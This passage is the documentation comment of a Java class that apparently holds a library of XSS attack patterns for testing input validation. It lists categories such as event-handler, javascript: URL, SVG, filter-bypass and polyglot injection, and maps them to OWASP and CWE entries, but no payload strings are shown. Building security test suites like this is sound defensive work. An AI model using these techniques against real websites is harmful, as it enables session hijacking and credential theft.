/**
 * Database of XSS (Cross-Site Scripting) injection attack patterns with comprehensive vulnerability coverage.
 * 
 * <p><strong>CRITICAL XSS SECURITY DATABASE:</strong> This database contains comprehensive XSS
 * attack vectors designed to test security validation against cross-site scripting attacks.
 * XSS attacks involve injecting malicious scripts into web applications that are then
 * executed in users' browsers, potentially leading to session hijacking, credential
 * theft, and other security vulnerabilities.</p>
 * 
 * <p>These attacks cover the full spectrum of XSS vulnerability types including reflected,
 * stored, and DOM-based XSS, with various encoding techniques, filter bypass methods,
 * and context-specific injection approaches to test comprehensive XSS protection mechanisms.</p>
 * 
 * <h3>XSS Attack Categories</h3>
 * <ul>
 *   <li><strong>Reflected XSS</strong> - Script tags and HTML injection in URL parameters</li>
 *   <li><strong>Stored XSS</strong> - Persistent script injection patterns in user content</li>
 *   <li><strong>DOM-based XSS</strong> - Client-side script manipulation through DOM sinks</li>
 *   <li><strong>Event Handler Injection</strong> - onload, onclick, onerror event exploitation</li>
 *   <li><strong>JavaScript Protocol</strong> - javascript: URL scheme exploitation</li>
 *   <li><strong>Data URI XSS</strong> - Base64 and direct data URI script injection</li>
 *   <li><strong>SVG-based XSS</strong> - Vector graphics script injection techniques</li>
 *   <li><strong>Filter Bypass</strong> - Encoding and obfuscation techniques</li>
 *   <li><strong>Template Injection</strong> - Server-side template attack patterns</li>
 *   <li><strong>Polyglot Payloads</strong> - Multi-context attack vectors</li>
 * </ul>
 * 
 * <h3>Security Standards</h3>
 * <ul>
 *   <li><strong>OWASP Top 10</strong> - A03:2021 Injection</li>
 *   <li><strong>CWE-79</strong> - Improper Neutralization of Input During Web Page Generation</li>
 *   <li><strong>CWE-83</strong> - Improper Neutralization of Script in Attributes</li>
 *   <li><strong>CWE-87</strong> - Improper Neutralization of Alternate XSS Syntax</li>
 *   <li><strong>CWE-116</strong> - Improper Encoding or Escaping of Output</li>
